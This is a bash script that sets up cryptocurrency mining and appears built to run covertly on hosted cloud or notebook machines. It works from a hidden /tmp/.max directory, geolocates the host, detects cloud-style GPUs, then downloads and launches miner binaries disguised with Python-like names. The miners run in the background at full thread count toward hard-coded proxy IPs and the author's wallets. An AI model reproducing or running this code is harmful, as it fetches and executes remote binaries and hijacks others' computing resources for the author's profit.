#!/bin/bash
echo 
echo -e '####################################################################################'
echo -e '############################# CPU2 Ver:0.9.52 ######################################'
echo -e '####################################################################################'
echo 
echo 
echo 

PROX=49.12.115.117
ETPort=443
RVPort=8080
VCPort=80
XMPort=21
TESTPort=587
DisplayRefrech=120

HZ_PROX1=49.12.115.117
HZ_PROX2=188.34.159.9
EU_PROX=49.12.115.117
US_PROX=173.199.123.152
CA_PROX=173.199.123.152
ASIA_PROX=49.12.115.117

#VCOptions="d=16,xn=1,hybrid"
#VCOptions="mc=VRSC"
VCOptions="c=DOGE,mc=VRSC"
#VCOptions="c=VRSC,mc=VRSC"

#VCOptions="X"

SWITCHOPG=AUTO
SWITCHOP=VC

#SWITCHPROX=AUTO
SWITCHPROX=$HZ_PROX1

VCThreads=$[$(nproc)*2]
XMThreads=$[$(nproc)*1]

#Debug=True
Debug=False

#Keys
W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
#W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
#W_VC="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
W_VC="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"

# Directory
Work_Dir="/tmp/.max/"
mkdir -p $Work_Dir
cd  $Work_Dir

##################### functions #####################################

function displaytime {
  local T=$1
  local D=$((T/60/60/24))
  local H=$((T/60/60%24))
  local M=$((T/60%60))
  local S=$((T%60))
  (( $D > 0 )) && printf '%d days ' $D
  (( $H > 0 )) && printf '%d hours ' $H
  (( $M > 0 )) && printf '%d minutes ' $M
  (( $D > 0 || $H > 0 || $M > 0 )) && printf 'and '
  printf '%d seconds\n' $S
}



##  CPU info

echo -e '#####################################   CPU info  ###########################################'

VCPUNUM=$(nproc)
cpufile=/proc/cpuinfo
test -f $cpufile || exit 1
CPUMODEL=$(grep "model name" $cpufile | sort -u | cut -d : -f 2-)
# echo -n CPU Model: $CPUMODEL
CPUCACHE=$(grep "cache size" $cpufile | sort -u | cut -d : -f 2-)
# echo " with $CPUCACHE cache."
CPUSPEED=$(grep "cpu MHz" $cpufile | sort -u | cut -d : -f 2-|tail -n 1)
# echo " with $CPUSPEED MHz."
numphy=$(grep "physical id" $cpufile | sort -u | wc -l)
# echo -n "Physical CPUs: ${numphy}.  "
numcore=$(grep "core id" $cpufile | sort -u | wc -l)
# echo -n "Cores/CPU: ${numcore}.  "
# echo -n "Physical cores: $((numcore * numphy)).  "
numlog=$(grep "processor" $cpufile | wc -l)
# echo "Logical cores: ${numlog}."

memtot=$(free -h | grep Mem | awk '{print $2}')
# echo -n "Total RAM: ${memtot}."

# The /usr/sbin/dmidecode command can give the number, size and speed of the
# installed RAM, but it must be run as root.
if [[ "$USER" == "root" ]]; then
    raminfo=$(dmidecode --type 17 |\
            awk '/Size/{if ($2!="No") printf "%s %s, ",$2,$3} {if ($1=="Speed:" && $2!="Unknown") print $2" "$3}' |\
            uniq -c)
#    echo -n "  Composition:"
#    echo "$raminfo" | awk '{if (NF==5) print "  "$1" x "$2" "$3" "$4" "$5"."}'
else
    echo
fi

gcard=$(lspci 2>> /tmp/.max/err| awk -F ':' '/VGA/{print $3}')
#echo "Graphics:${gcard}."

netinfo=$(ip addr 2>> /tmp/.max/err| grep -2 "en[o-p][0-9]\|eth[0-9]" | grep -1 "inet ")
macaddr=$(echo "$netinfo" | awk '/link/{print $2}')
ipaddr=$(echo "$netinfo" | awk '/inet/{print $2}' | awk -F'/' '{print $1}')
#echo "Ethernet: MAC Address: ${macaddr}.  IP Address: ${ipaddr}."

echo -e '#############################################################################################'



wget -q -O /tmp/jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
chmod +x /tmp/jq


INFIDIFF=$(curl -s  --connect-to api.minerstat.com:443:$HZ_PROX1:8888  https://api.minerstat.com//v2/coins\?list\=ETH,RVN,XMR,VRSC --insecure)

ETHDIF=$(echo  $INFIDIFF | /tmp/jq '.[0].difficulty')
ETHREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[0].reward')
ETHPRICE=$(echo  $INFIDIFF | /tmp/jq '.[0].price')


RVDIF=$(echo  $INFIDIFF | /tmp/jq '.[1].difficulty')
RVREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[1].reward')
RVPRICE=$(echo  $INFIDIFF | /tmp/jq '.[1].price')

VCDIF=$(echo  $INFIDIFF | /tmp/jq '.[3].difficulty')
VCREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[3].reward')
VCPRICE=$(echo  $INFIDIFF | /tmp/jq '.[3].price')

XMDIF=$(echo  $INFIDIFF | /tmp/jq '.[2].difficulty')
XMREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[2].reward')
XMPRICE=$(echo  $INFIDIFF | /tmp/jq '.[2].price')




ETHPROFIT=$(python3 -c "print('%.2f' % (22.0*$ETHREWARD*1e6*$ETHPRICE*24*30 ) )"  )
RVPROFIT=$(python3 -c "print('%.2f' % (8.0*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
VCPROFIT=$(python3 -c "print('%.2f' % (1.6*$VCREWARD*1e6*$VCPRICE*24*30 ) )")
XMPROFIT=$(python3 -c "print('%.2f' % ( 300.2*$XMREWARD*$XMPRICE*24*30 ) )"   )

echo "Normal Month worth : ET = $ETHPROFIT , RV = $RVPROFIT , VC = $VCPROFIT , XM = $XMPROFIT"


## getting IP info
#COININFO=$(wget -q -O - https://whattomine.com/coins.json)
#COININFO_PARSED=$(echo $COININFO|grep -oP '(?<="coins": ")[^"]*')
#ETINFO=$(echo $COININFO_PARSED|grep -oP '(?<="Ethereum": ")[^"]*')
#RVINFO=$(echo $COININFO_PARSED|grep -oP '(?<="Ravencoin": ")[^"]*')
JSINFO=$(wget -q -O - ipinfo.io)
CITY=$(echo $JSINFO|grep -oP '(?<="city": ")[^"]*')
REGION=$(echo $JSINFO|grep -oP '(?<="region": ")[^"]*')
COUNTRY=$(echo $JSINFO|grep -oP '(?<="country": ")[^"]*')
IPORG=$(echo $JSINFO|grep -oP '(?<="org": ")[^"]*')
IIP=$(echo $JSINFO|grep -oP '(?<="ip": ")[^"]*')
#IPNAME=$(sed 's|\.|o|g' <<< $IIP)
IPNAME=$(echo $IIP | sed -r 's!/.*!!; s!.*\.!!')
INFO="$COUNTRY""_""$IPNAME"
LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
#echo $JSINFO
echo "let's name it: $INFO"

################## Best Server ##################
if [ $SWITCHPROX == AUTO ]
then
    if [ $COUNTRY == US ]
    then
    PROX=$US_PROX
    elif [ $COUNTRY == CA ]
    then
    PROX=$CA_PROX
    elif [ $COUNTRY == TW ]
    then
    PROX=$ASIA_PROX
    elif [ $COUNTRY == CN ]
    then
    PROX=$ASIA_PROX
    elif [ $COUNTRY == JP ]
    then
    PROX=$ASIA_PROX
    elif [ $COUNTRY == BR ]
    then
    PROX=$US_PROX
    else
    PROX=$EU_PROX
    fi
else
    PROX=$SWITCHPROX
fi
#################################################

## COLORS
# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

# Background
On_Black='\033[40m'       # Black
On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_Cyan='\033[46m'        # Cyan
On_White='\033[47m'       # White

# High Intensity
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White

# Bold High Intensity
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White

# High Intensity backgrounds
On_IBlack='\033[0;100m'   # Black
On_IRed='\033[0;101m'     # Red
On_IGreen='\033[0;102m'   # Green
On_IYellow='\033[0;103m'  # Yellow
On_IBlue='\033[0;104m'    # Blue
On_IPurple='\033[0;105m'  # Purple
On_ICyan='\033[0;106m'    # Cyan
On_IWhite='\033[0;107m'   # White

#clen log

echo > oout
echo > ooutxm
echo  > ooutvc

##################################################################
########                Decision                         #########     
##################################################################

#################### CPU ARC ################################

if [ $(lscpu |grep avx512 |wc -l) == 1 ]
then 
echo -e "${On_IGreen}"'## CPU AVX512 ##'"${Color_Off}"
OP=XM
CPU='AVX512'
BCColor="$On_Green""$BICyan"
elif [ $(lscpu |grep avx2 |wc -l) == 1 ]
then
echo -e "${On_IBlue}"'##CPU AVX2 ##'"${Color_Off}"
OP=VC
CPU='AVX2'
BCColor="$On_Blue""$BICyan"
elif [ $(lscpu |grep avx |wc -l) == 1 ]
then
echo -e "${On_IYellow}"'## CPU AVX ##'"${Color_Off}"
OP=VC
CPU='AVX'
BCColor="$On_Yellow""$BICyan"
else
echo -e "${On_IRed}"'##  CPU OLD  ##'"${Color_Off}"
OP=VC
CPU='OLD'
BCColor="$On_Red""$BICyan"
fi

#################### GPU Type #########################
GPU=NULL
if [ $(nvidia-smi 2>> /tmp/.max/err | grep P100-PCIE |wc -l) == 1 ]
then

echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}"
GPU=P100
OPG=ET
PROG=CU
BGColor=$On_IGreen
elif [ $(nvidia-smi 2>> /tmp/.max/err | grep failed |wc -l) == 1 ]
then
echo -e "${On_IBlue}"'#### ONLY CPU ###'"${Color_Off}"
GPU=NONE
OPG=NONE
BGColor=$On_IRed
elif [ $( nvidia-smi 2>> /tmp/.max/err  2>&1 |  grep "not found" |wc -l) == 1 ]
then
echo -e "${On_IRed}"'### No cuda ONLY CPU ###'"${Color_Off}"
GPU=NONE
OPG=NONE
BGColor=$On_IRed
elif [ $(nvidia-smi 2>> /tmp/.max/err | grep T4 |wc -l) == 1 ]
then
echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}"
GPU=T4
OPG=ET
PROG=CU
BGColor=$On_IBlue
elif [ $(nvidia-smi 2>> /tmp/.max/err | grep K80 |wc -l) == 1 ]
then
echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}"
GPU=K80
OPG=RV
PROG=CU
BGColor="$On_IYellow""$BRed"
elif [ $(nvidia-smi 2>> /tmp/.max/err | grep P4 |wc -l) == 1 ]
then

echo -e "${On_ICyan}"'###    P4    ###'"${Color_Off}"
GPU=P4
OPG=ET
PROG=CU
BGColor=$On_ICyan
else
echo -e "${On_IPurple}"'###     Other GPU   ####'"${Color_Off}"
GPU=OTHER
OPG=ET
PROG=CL
BGColor=$On_IPurple

fi

##################################################################
########                execution                        #########     
##################################################################
if [ $SWITCHOPG == "AUTO" ]
then
#OP=$OP
OPG=$OPG
else
OPG=$SWITCHOPG
fi

if [ $SWITCHOP == "AUTO" ]
then
OP=$OP
else
OP=$SWITCHOP
fi


i="0"

while true
do
if [ $OP == "XM" ]
then
    ####### XM
    #               Executable
    echo start >> ooutxm
    rm -rf pythonxm
    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
    chmod +x pythonxm
    #                Config
    wget -q https://github.com/one10001/10001code/raw/main/config.json
    sed -i "s+ip0001+RV_$IPNAME+g" config.json
    sed -i "s+49.12.115.117+$PROX+g" config.json
    sed -i "s+:8080+:$XMPort+g" config.json
    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json

    nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &

elif [ $OP == "VC" ]
then  
    ###### VC
    echo start >> ooutvc
    rm -rf pythonheq
    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
    chmod +x pythonheq

    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
else
    VCThreads=$[$(nproc)/2]
    XMThreads=$[$(nproc)/2]
        ####### XM
    #               Executable
    echo start >> ooutxm
    rm -rf pythonxm
    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
    chmod +x pythonxm
    #                Config
    wget -q https://github.com/one10001/10001code/raw/main/config.json
    sed -i "s+ip0001+RV_$IPNAME+g" config.json
    sed -i "s+49.12.115.117+$PROX+g" config.json
    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json

    nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
    echo start >> ooutvc
    rm -rf pythonheq
    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
    chmod +x pythonheq

    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
fi

if [ $OPG == "ET" ]
then
    rm -rf pyeth2
    wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2 2> lol.out
    chmod +x pyeth2
    if  [ $PROG == "CU" ]
    then
        nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
    else
        nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
    fi

elif [ $OPG == "RV" ]
then
    rm -rf python2.6.6
    wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
    chmod +x python2.6.6
    if  [ $PROG == "CU" ]
    then
    nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
    else
    nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
    fi
else
    echo "No GPU"
fi


##################################################################
########                Display                          #########     
##################################################################
i=0
while true
    do
        i=$[$i+1]
        echo -e "${On_IWhite}${BIGreen}Timer: $(displaytime $[($i-1)*$DisplayRefrech])|${On_IWhite}${BIBlue} IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG ${Color_Off}"
        if [ $GPU == "NONE" ]
        then
        echo -e "${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot | PROX: $PROX  "
        else
        echo -e "${BIYellow}${BGColor}GPU OP: $OPG  | GPU: $GPU / $PROG |${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot | PROX: $PROX "
        fi
        
        Gacc=$(grep Acc oout | wc -l)
        Vacc=$(grep Acc ooutvc | wc -l)
        Xacc=$(grep acc ooutxm | wc -l)

        if [ $GPU == "NONE" ]
        then
        echo -e "ONLY CPU " > /tmp/envtype
        else
        echo -e "CPU + GPU" > /tmp/envtype
                Gspeed=$(grep 'Mh' oout | tail -n 1 |awk -F" " '{print $7}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
                Gping=$(grep 'ms' oout | tail -n 1 |awk -F" " '{print $6}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
                GSHARE=$(grep Acc oout | wc -l)
                GRATIO=$[$GSHARE*3600/($i*$DisplayRefrech)]
                GPROFIT=0
                if [ $OPG == "RV" ]
                then
                GPROFIT=$(python3 -c "print('%.2f' % ($RVREWARD * $Gspeed * 1e6 * $RVPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
                else
                GPROFIT=$(python3 -c "print('%.2f' % ($ETHREWARD * $Gspeed * 1e6 * $ETHPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
                fi
                echo -e "${BIWhite}${BGColor}GPU $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off} | GPing :${BIRed} $Gping ${Color_Off} | PerMonth :${BIRed} $GPROFIT ${Color_Off}" 

        fi


     

        if [ $OP == "XM" ]
        then
            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}'| sed 's|H/s||g'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")  
            XSHARE=$(grep acc ooutxm | wc -l)
            Xping=$(grep acc ooutxm | tail -n 1 |awk -F"(" '{print $3}'|awk -F"ms" '{print $1}')
            XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
            XMPROFIT=$(python3 -c "print('%.2f' % ($Xspeed * $XMREWARD * $XMPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
            echo -e "${BIWhite}${On_Red}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off} | Xping :${BIRed} $Xping ${Color_Off} | PerMonth :${BIRed} $XMPROFIT ${Color_Off}" 
        elif [ $OP == "VC" ]
        then
            Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
            VSHARE=$(grep Acc ooutvc | wc -l)
            VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
            VCPROFIT=$(python3 -c "print('%.2f' % ( $Vspeed * $VCREWARD * 1e6 * $VCPRICE * 24 *30 ))" 2>> /tmp/.max/err) 
            echo -e "${BIWhite}${On_Blue}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off} | PerMonth :${BIRed} $VCPROFIT ${Color_Off}" 
        else 
            Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
            VSHARE=$(grep Acc ooutvc | wc -l)
            VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
            echo -e "${BIWhite}${On_Blue}CPU VC -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
            XSHARE=$(grep acc ooutxm | wc -l)
            Xping=$(grep acc ooutxm | tail -n 1 |awk -F"(" '{print $3}'|awk -F"ms" '{print $1}')
            XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
            echo -e "${BIWhite}${On_Red} XM -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
       
        fi

        if [ $Debug == "True" ]
        then 
            echo '###########################################  OOUT  #############################################'
            tail oout
            echo '###########################################  OOUTXM  #############################################'
            tail ooutxm
            echo '###########################################  OOUTVC  #############################################'
            tail ooutvc
            echo 
        fi
        #i=$[$i+1]
        echo 
        echo 
        sleep $DisplayRefrech
        
    done




echo -e "#######################   Process  Killed    #########################"
                  
done
tail -f oout